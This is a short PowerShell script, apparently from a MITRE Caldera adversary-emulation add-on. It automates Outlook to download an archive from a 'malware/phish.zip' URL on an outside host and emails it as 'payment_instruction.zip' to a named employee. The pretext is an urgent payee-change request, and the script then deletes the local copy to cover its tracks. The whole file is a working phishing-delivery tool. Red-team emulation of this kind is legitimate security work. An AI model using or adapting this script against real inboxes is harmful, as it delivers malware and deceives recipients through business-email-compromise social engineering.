# Create an Outlook application object
$Outlook = New-Object -ComObject Outlook.Application

# Define the download URL and the local file path
$downloadUrl = "http://198.18.128.192/caldera-addon/malware/phish.zip"
$attachmentPath = Join-Path -Path $env:temp -ChildPath "payment_instruction.zip"

# Download the file using Invoke-WebRequest
Invoke-WebRequest -Uri $downloadUrl -OutFile $attachmentPath

# Create a new email item
$mail = $Outlook.CreateItem(0)

# Set email parameters
$mail.Subject = "Need this Payee added ASAP"
$mail.Body = @"
Hi Carol,

I will be out of office tomorrow, please add payee ASAP as we need to get the payment settled.

Bye,  
Grady.
"@
$mail.To = "cdanvers@pseudo-ai.com"

# Add the downloaded file as an attachment
$mail.Attachments.Add($attachmentPath)

# Send the email
$mail.Send()

# Optionally, clean up the downloaded file after sending the email
if (Test-Path -Path $attachmentPath) {
    Remove-Item -Path $attachmentPath -Force
}
